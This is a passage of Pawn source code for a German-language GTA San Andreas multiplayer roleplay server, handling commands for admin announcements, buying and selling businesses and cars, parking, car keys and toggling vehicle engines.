		format(string, sizeof(string), "(( * Moderator %s: %s ))", sendername, result);
		OOCNews(RED, string);
		}
		else if(PlayerInfo[playerid][pAdmin] == 1338)
		{
		format(string, sizeof(string), "(( * Admin %s: %s ))", sendername, result);
		OOCNews(RED, string);
		}
		else if(PlayerInfo[playerid][pAdmin] == 2000)
		{
		format(string, sizeof(string), "(( * Head-Admin %s: %s ))", sendername, result);
		OOCNews(RED, string);
		}
		else if(PlayerInfo[playerid][pAdmin] == 2001)
		{
		format(string, sizeof(string), "(( * Projektleitung %s: %s ))", sendername, result);
		OOCNews(RED, string);
		}
		else if(PlayerInfo[playerid][pAdmin] == 2002)
		{
		format(string, sizeof(string), "(( * Projektleitung %s: %s ))", sendername, result);
		OOCNews(RED, string);
		}
		else if(PlayerInfo[playerid][pAdmin] >= 2005)
		{
		format(string, sizeof(string), "(( * UC-Admin: %s ))", result);
		OOCNews(RED, string);
		}


	}
	else
	{
	SendClientMessage(playerid, COLOR_GREY, " Du bist kein Admin!");
	}
	}//not connected
	return 1;
	}
    //----------------------------------[Cars respawnen]-----------------------------------------------
	if(strcmp(cmd, "/respawncars", true) == 0)
	{
	    	if(PlayerInfo[playerid][pAdmin] > 2000)
			{
            SetTimer("respawncars",1000,0);
		    }
		return 1;
	}
	if(strcmp(cmd, "/spawnchange", true) == 0)// Mehrere Häuser kaufbar machen
	{
	    if(IsPlayerConnected(playerid))
	    {
				if(WohnwagenID[playerid] != 0)
				{
			        ShowPlayerDialog(playerid, 4818, DIALOG_STYLE_LIST, "Spawnchange", "Noobspawn\nFraktion\nHaus\nWohnwagen", "Auswählen", "Abbrechen");
		    	}
				else
	            {
	      			ShowPlayerDialog(playerid, 4818, DIALOG_STYLE_LIST, "Spawnchange", "Noobspawn\nFraktion\nHaus", "Auswählen", "Abbrechen");
				}
	    }
	    return 1;
	}










   	if(strcmp(cmd, "/buybiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new Float:oldposx, Float:oldposy, Float:oldposz;
            GetPlayerName(playerid, playername, sizeof(playername));
            GetPlayerPos(playerid, oldposx, oldposy, oldposz);
            if(PlayerInfo[playerid][pPbiskey] != 255)
            {
                SendClientMessage(playerid, COLOR_WHITE, "   Du besitzt schon ein Business, tipp /sellbiz wenn du dieses willst.");
				return 1;
            }
            for(new b = 0; b < sizeof(SBizzInfo); b++)
            {
                if(IsPlayerInRangeOfPoint(playerid,2, SBizzInfo[b][sbEntranceX], SBizzInfo[b][sbEntranceY], SBizzInfo[b][sbEntranceZ]) && SBizzInfo[b][sbOwned] == 0)
                {
                    if(PlayerInfo[playerid][pLevel] < 3)
                    {
                        format(string, sizeof(string), "Du musst mindestens Level 3 sein um ein Business kaufen zu können!");
                        SendClientMessage(playerid, COLOR_GRAD5, string);
                    }
					if(GetPlayerMoneySave(playerid) > SBizzInfo[b][sbBuyPrice])
					{
                        PlayerInfo[playerid][pPbiskey] = b+100;
                        SBizzInfo[b][sbOwned] = 1;
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        strmid(SBizzInfo[b][sbOwner], sendername, 0, strlen(sendername), 255);
						GivePlayerMoneySave(playerid,-SBizzInfo[b][sbBuyPrice]);
                        PlayerPlayMusic(playerid);
                        SendClientMessage(playerid, COLOR_WHITE, "Gratulation für dein neues Gewerbe.");
                        SendClientMessage(playerid, COLOR_WHITE, "Gib /help ein, um Hilfe für dein neues Gewerbe zu bekommen.");
//                   		format(string, sizeof(string), "==== [sBizz ID: %d] ====\nName: %s\nBesitzer: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",b,SBizzInfo[b][sbMessage],SBizzInfo[b][sbOwner],SBizzInfo[b][sbBuyPrice],SBizzInfo[b][sbEntranceCost],SBizzInfo[b][sbProducts],SBizzInfo[b][sbMaxProducts]);
//                     	Update3DTextLabelText(SBizzInfo[b][sB_text],COLOR_YELLOW,string);
						DateProp(playerid);
                        OnPropUpdate_sb(b);
                        SaveMysqlPlayer(playerid);
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "Du hast nicht genug Geld, um das Gewerbe kaufen zu können.");
                    }
                }
            }
            for(new b = 0; b < sizeof(BizzInfo); b++)
            {
                if(IsPlayerInRangeOfPoint(playerid,2, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bOwned] == 0)
                {
                    if(PlayerInfo[playerid][pLevel] < 3)
                    {
                        format(string, sizeof(string), "Du musst mindestens Level 3 sein um die biz kaufen zu können!");
                        SendClientMessage(playerid, COLOR_GRAD5, string);
                    }
					if(GetPlayerMoneySave(playerid) > BizzInfo[b][bBuyPrice])
					{
                        PlayerInfo[playerid][pPbiskey] = b;
                        BizzInfo[b][bOwned] = 1;
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        strmid(BizzInfo[b][bOwner], sendername, 0, strlen(sendername), 255);
						GivePlayerMoneySave(playerid,-BizzInfo[b][bBuyPrice]);
                        PlayerPlayMusic(playerid);
//                        if(b != 7 || b != 8 || b != 9) {
//	                        SetPlayerInterior(playerid,BizzInfo[b][bInterior]);
//	                        PlayerInfo[playerid][pInt] = BizzInfo[b][bInterior];
//	//                        SetPlayerPos(playerid,BizzInfo[b][bExitX],BizzInfo[b][bExitY],BizzInfo[b][bExitZ]);
//						}
//                        GameTextForPlayer(playerid, "~w~Willkommen~n~Um es zu Verlassen tipp Exit (An der Tuer) ein", 5000, 3);
//                        PlayerInfo[playerid][pInt] = BizzInfo[b][bInterior];
//                        PlayerInfo[playerid][pLocal] = b ;
                        SendClientMessage(playerid, COLOR_WHITE, "Gratulation für dein neues Gewerbe.");
                        SendClientMessage(playerid, COLOR_WHITE, "Gib /help ein, um Hilfe für dein neues Gewerbe zu bekommen.");
//      					format(string, sizeof(string), "==== [Bizz ID: %d] ====\nName: %s\nBesitzer: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",b,BizzInfo[b][bMessage],BizzInfo[b][bOwner],BizzInfo[b][bBuyPrice],BizzInfo[b][bEntranceCost],BizzInfo[b][bProducts],BizzInfo[b][bMaxProducts]);
//                     	Update3DTextLabelText(BizzInfo[b][B_text],COLOR_YELLOW,string);
						DateProp(playerid);
                        OnPropUpdate_b(b);
                        //PlayerUpdate(playerid);
                        SaveMysqlPlayer(playerid);
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "Du hast nicht genug Geld, um das Gewerbe kaufen zu können.");
                    }
                }
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/sellbiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            if(PlayerInfo[playerid][pPbiskey] == 255)
            {
                SendClientMessage(playerid, COLOR_WHITE, "Du besitzt kein Gewerbe.");
                return 1;
            }
            if(PlayerInfo[playerid][pPbiskey] >= 100 && strcmp(playername, SBizzInfo[PlayerInfo[playerid][pPbiskey]-100][sbOwner], true) == 0)
            {
                new bouse = PlayerInfo[playerid][pPbiskey]-100;
				GivePlayerMoneySave(playerid,SBizzInfo[bouse][sbTill]);
//                PlayerMoney[playerid] = PlayerMoney[playerid]+SBizzInfo[bouse][sbTill];
                SBizzInfo[bouse][sbLocked] = 1;
                SBizzInfo[bouse][sbOwned] = 0;
                GetPlayerName(playerid, sendername, sizeof(sendername));
                strmid(SBizzInfo[bouse][sbOwner], "Zu Verkaufen", 0, strlen("Zu Verkaufen"), 255);
                strmid(SBizzInfo[bouse][sbExtortion], "Niemand", 0, strlen("Niemand"), 255);
                ConsumingMoney[playerid] = 1;
                PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                format(string, sizeof(string), "~w~Gluekwunsch~n~ Du hast dein Geschaeft verkauft. Premie ~n~~g~$%d", SBizzInfo[bouse][sbTill]);
                GameTextForPlayer(playerid, string, 10000, 3);
//          		format(string, sizeof(string), "==== [sBizz ID: %d] ====\nName: %s\nBesitzer: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",bouse,SBizzInfo[bouse][sbMessage],SBizzInfo[bouse][sbOwner],SBizzInfo[bouse][sbBuyPrice],SBizzInfo[bouse][sbEntranceCost],SBizzInfo[bouse][sbProducts],SBizzInfo[bouse][sbMaxProducts]);
//           		Update3DTextLabelText(SBizzInfo[bouse][sB_text],COLOR_YELLOW,string);
                SBizzInfo[bouse][sbTill] = 0;
                PlayerInfo[playerid][pPbiskey] = 255;
  			    GivePlayerMoneySave(playerid,  SBizzInfo[bouse][sbBuyPrice]/2);
//                PlayerMoney[playerid] = PlayerMoney[playerid] + floatround(SBizzInfo[bouse][sbBuyPrice]/2);
                OnPropUpdate_sb(bouse-100);
                //PlayerUpdate(playerid);
                SaveMysqlPlayer(playerid);
            }
            if(strcmp(playername, BizzInfo[PlayerInfo[playerid][pPbiskey]][bOwner], true) == 0)
            {
                new bouse = PlayerInfo[playerid][pPbiskey];
                BizzInfo[bouse][bLocked] = 1;
                BizzInfo[bouse][bOwned] = 0;
                GetPlayerName(playerid, sendername, sizeof(sendername));
                strmid(BizzInfo[bouse][bOwner], "Zu Verkaufen", 0, strlen("Zu Verkaufen"), 255);
                strmid(BizzInfo[bouse][bExtortion], "Niemand", 0, strlen("Niemand"), 255);
                ConsumingMoney[playerid] = 1;
 			    GivePlayerMoneySave(playerid, BizzInfo[bouse][bTill]);
//                PlayerMoney[playerid] = PlayerMoney[playerid]+BizzInfo[bouse][bTill];
                PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                format(string, sizeof(string), "~w~Gluekwunsch~n~ Du hast dein Geschaeft verkauft. Premie ~n~~g~$%d", BizzInfo[bouse][bTill]);
//          		format(string, sizeof(string), "==== [Bizz ID: %d] ====\nName: %s\nBesitzer: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",bouse,BizzInfo[bouse][bMessage],BizzInfo[bouse][bOwner],BizzInfo[bouse][bBuyPrice],BizzInfo[bouse][bEntranceCost],BizzInfo[bouse][bProducts],BizzInfo[bouse][bMaxProducts]);
//           		Update3DTextLabelText(BizzInfo[bouse][B_text],COLOR_YELLOW,string);
				GameTextForPlayer(playerid, string, 10000, 3);
                BizzInfo[bouse][bTill] = 0;
                PlayerInfo[playerid][pPbiskey] = 255;
                OnPropUpdate_b(bouse);
                //PlayerUpdate(playerid);
                SaveMysqlPlayer(playerid);
            }
            else
            {
                SendClientMessage(playerid, COLOR_WHITE, "Dir gehört kein Geschäft.");
            }
        }
        return 1;
    }
	if(strcmp(cmdtext,"/carsell",true)==0)
	{
				    if(Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])
					{
						new stringgibtesnet[128];
               			format(stringgibtesnet, sizeof(stringgibtesnet), "Möchtest du dein Auto wirklich verkaufen ?\n\nDu bekommst beim Verkauf %d$\n\nFahrzeug: %s\n\nHinweis! Du kannst das Auto per /sellcar ID Preis an einen Spieler verkaufen!", PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPreis] / 2,CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
						ShowPlayerDialog(playerid, AUTOVERKAUFENAMK, DIALOG_STYLE_MSGBOX, "Fahrzeug Verkaufen", stringgibtesnet, "Verkaufen", "Abbrechen");
						DialogShowed[playerid] = 1;
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Du besitzt auf diesem Slot kein Fahrzeug!");
					    return 1;
					}
	    return true;
	}
/*
	if(strcmp(cmdtext,"/fcarsell",true)==0)
	{
	    if(GetPlayerLeader(playerid))
		{
	        if(IsAllowedFactionToBuy(GetPlayerFaction(playerid)))
			{
	            if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
				{
					new Carid1 = GetPlayerVehicleID(playerid);
					for(new fc;fc<sizeof(FactionCars);fc++)
					{
	                    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
						{
	                        if(Carid1 == FactionCars[fc][fCarid])
							{
							    if(FactionCars[fc][fFaction][0] == GetPlayerLeader(playerid))
								{
									if(FactionCars[fc][fTuning][14] != 0)
									{
										DestroyDynamicObject(SireneFrak[FactionCars[fc][fCarid]]);
									}
							        FactionCars[fc][fVehid] = -255;
							        if(DestroyVehicle(FactionCars[fc][fCarid]))
							        FactionCars[fc][fCarid] = -255;
									new fText[178];
									format(fText,sizeof(fText),"Du hast das Fraktionsfahrzeug erfolgreich für $%d(50%% vom Kaufpreis) verkauft.",(FactionCars[fc][fPrice]/2));
									SendClientMessage(playerid,COLOR_LIGHTBLUE,fText);
                                    GivePlayerMoneySave(playerid, FactionCars[fc][fPrice]/2);
							    }
							    else SendClientMessage(playerid,COLOR_GRAD2,"Du bist nicht der besitzer dieses Fahrzeuges.");
							    return true;
							}
	                    }
	                }
					SendClientMessage(playerid,COLOR_GRAD2,"Das ist kein Fraktionsfahrzeug.");
				}
				else SendClientMessage(playerid,COLOR_GRAD2,"Du musst der Fahrer eines Fahrzeuges sein.");
	        }
			else SendClientMessage(playerid,COLOR_GRAD2,"Deine Fraktion ist dazu nicht berechtigt.");
	    }
		else SendClientMessage(playerid,COLOR_GRAD2,"Du bist nicht berechtigt diesen Befehl anzuwenden.");
	    return true;
	}
*/
	if(strcmp(cmdtext,"/parken",true)==0)
	{
			if(!IsPlayerInAnyVehicle(playerid))
		   	{
			SendClientMessage(playerid, COLOR_GREY, "Du bist in keinen Fahrzeug!");
			return 1;
			}
			new vid = GetPlayerVehicleID(playerid);
			if(IsADtCar(vid))// Privatfahrzeug
	   		{




				new carowner = GetDtCarOwner(vid);
	            new slot = GetDtCarOwnerSlot(carowner,vid);
				if (carowner == playerid)
				{
							new Float:X,Float:Y,Float:Z;
							new Float:z_rot;
							GetPlayerPos(playerid, X,Y,Z);
							GetVehicleZAngle(vid, z_rot);
		    				PlayerCar[carowner][slot][CarPos_x] = X;
					    	PlayerCar[carowner][slot][CarPos_y] = Y;
					    	PlayerCar[carowner][slot][CarPos_z] = Z;
					    	PlayerCar[carowner][slot][CarRotate] = z_rot;
					    	SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dein Fahrzeug hier geparkt!");
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!");
				    return 1;
				}
			}
	        else for(new fc;fc<sizeof(FactionCars);fc++)// Fraktionsfahrzeug
			{
		        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
				{
		            if(vid == FactionCars[fc][fCarid])
					{
				        if(PlayerInfo[playerid][sMember] == FactionCars[fc][fFaction] || PlayerInfo[playerid][pAdmin] >=4)
						{
						        GetVehiclePos(FactionCars[fc][fCarid],FactionCars[fc][fPos][0],FactionCars[fc][fPos][1],FactionCars[fc][fPos][2]);
								GetVehicleZAngle(FactionCars[fc][fCarid],FactionCars[fc][fPos][3]);
						        SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast das Fraktionsfahrzeug erfolgreich geparkt!");
						}
					}
				}
			}
			for(new org;org<sizeof(OrgAuto);org++)// OrgFahrzeuge
			{
		        if(OrgAuto[org][orgvehtype] >= 400 && OrgAuto[org][orgvehtype] <= 611)
				{
		            if(vid == OrgAuto[org][LocalID])
					{
				        if(PlayerInfo[playerid][pOrgMember] == OrgAuto[org][autoorgid] || PlayerInfo[playerid][pAdmin] >=4)
						{
						        GetVehiclePos(OrgAuto[org][LocalID],OrgAuto[org][orgautox],OrgAuto[org][orgautoy],OrgAuto[org][orgautoz]);
								GetVehicleZAngle(OrgAuto[org][LocalID],OrgAuto[org][orgautor]);
						        SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast das Organisationsfahrzeug erfolgreich geparkt!");

						        //OrgAuto[org][orgautox] =
						}
					}
				}
			}
		return 1;
	}
	/*
	enum OrgAutosInfo
{
	LocalID,
	orgautodbid,
	autoorgid,
	orgvehtype,
	Float:orgautox,
	Float:orgautoy,
	Float:orgautoz,
	Float:orgautor,
	orgautocolor,
	orgautocolor2,
	orgautokaufpreis
}*/
	if(strcmp(cmd, "/carkey", true) == 0)
	{
		if(CarDarfKeyNetChangen[playerid] == 1)
		{
			SendClientMessage(playerid,COLOR_GRAD2,"Du kannst deinen Carkey derzeit nicht ändern!");
			return 1;
		}
		new mc = PlayerInfo[playerid][pCarkeys];
		if(mc > 1)
		{
			new mvstring[4024];
			for(new mv;mv<PlayerInfo[playerid][pCarkeys];mv++)
			{
				if(Dtc_PlayerHaveCar[playerid][mv])
				{
					if(PlayerCar[playerid][mv][Abgeschleppt] == 1)
					{
						format(mvstring,2024,"%s\n{FF0000}%s Abgeschleppt{FFFFFF}",mvstring,CarName[PlayerCar[playerid][mv][CarModel]-400]);
					}
					else
					{
						format(mvstring,2024,"%s\n%s",mvstring,CarName[PlayerCar[playerid][mv][CarModel]-400]);
					}
				}
				else
				{
					format(mvstring,2024,"%s\nFreier Slot",mvstring);
				}
			}
			ShowPlayerDialog(playerid,DIALOG_CARKEYS,DIALOG_STYLE_LIST,"Autoschlüssel",mvstring,"Auswählen","Abbrechen");
		}
        return 1;
	}
	if(strcmp(cmd, "/atune",true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 2002)
	    {
		    ShowPlayerDialog(playerid, 4575, DIALOG_STYLE_LIST, "Tunings", "10x Nitro\nWheel Mega\nPaintjob geht nur beim Camper\nLPG-Gasanlage\nHydraulik\nBiTurbo Turismo", "Auswählen", "Abbrechen");
		}
		return 1;
	}
	if(strcmp(cmd, "/motor",true) == 0)
	{
	    if(IsANoTachoVehicle(GetPlayerVehicleID(playerid)))
    	{
		    SendClientMessage(playerid, COLOR_GRAD2, "Dieses Fahrzeug besitzt keinen Motor.");
		    return 1;
		}
		new motorstring[128];
  		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
  		new engine,lights,alarm,doors,bonnet,boot,objective;
    	new vid = GetPlayerVehicleID(playerid);
		GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
 		if(IsADtCar(vid))// Privatfahrzeug
   		{
			new carowner = GetDtCarOwner(vid);
	        new slot = GetDtCarOwnerSlot(carowner,vid);
			if (carowner == playerid)// playerid
			{
	        	if(vid != INVALID_VEHICLE_ID)
	          	{
	          	    if(IsPlayerNPC(playerid))
	          	    {
	          	        SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
	          	        return 1;
	  				}
				    if(PlayerCar[carowner][slot][Benzin] <= 1)
					{
						SCM(playerid, COLOR_GREY, "Es befindet sich zu wenig Treibstoff im Fahrzeug um den Motor zu Starten!");
						return 1;
					}
				    if(PlayerCar[carowner][slot][Abgeschleppt] == 1)
					{
						SCM(playerid, COLOR_GREY, "Das Fahrzeug wurde vom Ordnungsamt Beschlagnahmt! Du musst es erst Freikaufen!");
						return 1;
					}
		          	if(engine == VEHICLE_PARAMS_ON)
			   		{
				    	SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
						format(motorstring, sizeof(motorstring), "%s stellt den Motor ab", GetName(playerid));
						SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du stellst den Motor ab.");
					}
					else
					{
						format(motorstring, sizeof(motorstring), "%s betätigt die Zündung", GetName(playerid));
						SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
			  			SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du betätigst die Zündung.");
					//	PlayerCar[carowner][slot][BombeDrin] = 1;
					}
				}
	  		}


			else
			{




//		new motorstring[128];
//  		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
//  		new engine,lights,alarm,doors,bonnet,boot,objective;
//    	new vid = GetPlayerVehicleID(playerid);
//		GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);


//>
//			new carowner = GetDtCarOwner(vid);
//		    new slot = GetDtCarOwnerSlot(carowner,vid);

/*


			if(!strcmp(PlayerCar[carowner][slot][CarGivekey], PlayerInfo[playerid][Name], true))

			printf("%d x %d", PlayerCar[carowner][slot][CarGivekey], PlayerInfo[playerid][Name]);
			printf("%i x %i", PlayerCar[carowner][slot][CarGivekey], PlayerInfo[playerid][Name]);
			printf("%s x %s", PlayerCar[carowner][slot][CarGivekey], PlayerInfo[playerid][Name]);
			{
	        	if(vid != INVALID_VEHICLE_ID)
	          	{


				    if(PlayerCar[carowner][slot][Benzin] <= 1)
					{
						SCM(playerid, COLOR_GREY, "Es befindet sich zu wenig Treibstoff im Fahrzeug um den Motor zu Starten!");
						return 1;
					}
				    if(PlayerCar[carowner][slot][Abgeschleppt] == 1)
					{
						SCM(playerid, COLOR_GREY, "Das Fahrzeug wurde vom Ordnungsamt Beschlagnahmt! du musst es freikaufen");
						return 1;
					}
		          	if(engine == VEHICLE_PARAMS_ON)
			   		{
				    	SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
						format(motorstring, sizeof(motorstring), "%s stellt den Motor ab", GetName(playerid));
						SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du stellst den Motor ab.");
					}
					else
					{
						format(motorstring, sizeof(motorstring), "%s betätigt die Zündung", GetName(playerid));
						SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
			  			SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du betätigst die Zündung.");
					}
				}

			}

			else
	        {
			SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!.");
			return 1;
			}
*/
//<






				if(PlayerInfo[playerid][pAdmin] > 2000)
				{




		          	if(engine == VEHICLE_PARAMS_ON)
			   		{
				    	SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
						format(motorstring, sizeof(motorstring), "%s stellt den Motor ab", GetName(playerid));
						SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du stellst den Motor Administrativ ab.");
					}
					else
					{
						format(motorstring, sizeof(motorstring), "%s betätigt die Zündung", GetName(playerid));
						SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
			  			SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du betätigst Administrativ die Zündung.");
					}


					return 1;





				}


				SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!.");
				return 1;
			}
	}

/*
			else
			{
			    for(new i = 0; i < MAX_VEHICLES; i++)
			    {
					if(IsADtCar(i))// Privatfahrzeug
			   		{
						new carowner1 = GetDtCarOwner(i);
			            new slot1 = GetDtCarOwnerSlot(carowner1,i);
						if (i == GetPlayerVehicleID(playerid))// playerid
						{

							if(strcmp(PlayerCar[i][slot][CarGivekey], PlayerInfo[playerid][Name], true) == 0)

//							if (PlayerCar[i][slot][CarGivekey] == PlayerInfo[playerid][Name])// playerid
							{
							    if(PlayerCar[carowner1][slot1][Benzin] <= 1)
								{
									SCM(playerid, COLOR_GREY, "Es befindet sich zu wenig Treibstoff im Fahrzeug um den Motor zu Starten!");
									return 1;
								}
							    if(PlayerCar[carowner1][slot1][Abgeschleppt] == 1)
								{
									SCM(playerid, COLOR_GREY, "Das Fahrzeug wurde vom Ordnungsamt Beschlagnahmt! Wende dich an den Fahrzeug besitzer!");
									return 1;
								}
					          	if(engine == VEHICLE_PARAMS_ON)
						   		{
							    	SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
									format(motorstring, sizeof(motorstring), "%s stellt den Motor ab", GetName(playerid));
									SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
									SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du stellst den Motor ab.");
								}
								else
								{
									format(motorstring, sizeof(motorstring), "%s betätigt die Zündung", GetName(playerid));
									SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
						  			SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
									SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du betätigst die Zündung.");
								}
							}
							else
							{
							SCM(playerid, COLOR_GREY, "Du besitzt keinen Schlüssel für dieses Fahrzeug!");
							return 1;
							}
						}
					}
			    }
			}
	    }
*/
		else if(IsAPilotCar(vid) || IsABusCar(vid) || IsAFarmFahrzeug(vid)|| IsAZug(vid) || IsAEventCar(vid) ||IsAMuellFahrzeug(vid)|| IsAKartFahrzeug(vid)|| IsATaxiFahrzeug(vid))// Jobfahrzeuge
		{
	        	if(vid != INVALID_VEHICLE_ID)
	          	{
		          	if(engine == VEHICLE_PARAMS_ON)
			   		{
						format(motorstring, sizeof(motorstring), "%s stellt den Motor ab", GetName(playerid));
						SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
				    	SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du stellst den Motor ab.");
					}
					else
					{
						format(motorstring, sizeof(motorstring), "%s betätigt die Zündung", GetName(playerid));
						SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
			  			SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du betätigst die Zündung.");
					}
				}
		}
        else for(new fc;fc<sizeof(FactionCars);fc++)// Fraktionsfahrzeug
		{
	        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
			{
	            if(vid == FactionCars[fc][fCarid])
				{
			        if(PlayerInfo[playerid][sMember] == FactionCars[fc][fFaction])
					{
				        if(vid != INVALID_VEHICLE_ID)
			          	{
				            if(FactionCars[fc][fTuning][16] <= 1)
							{
						    SCM(playerid, COLOR_GREY, "Es befindet sich zu wenig Treibstoff im Fahrzeug um den Motor zu Starten!");
							return 1;
							}
					        if(engine == VEHICLE_PARAMS_ON)
							{
								format(motorstring, sizeof(motorstring), "%s stellt den Motor ab", GetName(playerid));
								SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
						    	SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du stellst den Motor ab.");
							}
							else
							{
								format(motorstring, sizeof(motorstring), "%s betätigt die Zündung", GetName(playerid));
								SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
				  				SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du betätigst die Zündung.");
							}
						}
					}
					else
					{
						if(PlayerInfo[playerid][pAdmin] > 2000)
						{




				          	if(engine == VEHICLE_PARAMS_ON)
					   		{
						    	SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
								format(motorstring, sizeof(motorstring), "%s stellt den Motor ab", GetName(playerid));
								SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du stellst den Motor Administrativ ab.");
							}
							else
							{
								format(motorstring, sizeof(motorstring), "%s betätigt die Zündung", GetName(playerid));
								SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
					  			SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du betätigst Administrativ die Zündung.");
							}


							return 1;





						}
					    SCM(playerid, COLOR_GREY, "Du besitzt keinen Schlüssel für dieses Fahrzeug!");
					}
				}
			}
	    }

   	 	for(new fc;fc<sizeof(OrgAuto);fc++)// Fraktionsfahrzeug
		{
	        if(OrgAuto[fc][orgvehtype] >= 400 && OrgAuto[fc][orgvehtype] <= 611) // orgvehtype
			{
	            if(vid == OrgAuto[fc][LocalID])
				{
			        if(PlayerInfo[playerid][pOrgMember] == OrgAuto[fc][autoorgid])
					{
				        if(vid != INVALID_VEHICLE_ID)
			          	{
				            /*if(FactionCars[fc][fTuning][16] <= 1)
							{
						    SCM(playerid, COLOR_GREY, "Es befindet sich zu wenig Treibstoff im Fahrzeug um den Motor zu Starten!");
							return 1;
							}*/
					        if(engine == VEHICLE_PARAMS_ON)
							{
								format(motorstring, sizeof(motorstring), "%s stellt den Motor ab", GetName(playerid));
								SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
						    	SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du stellst den Motor ab.");
							}
							else
							{
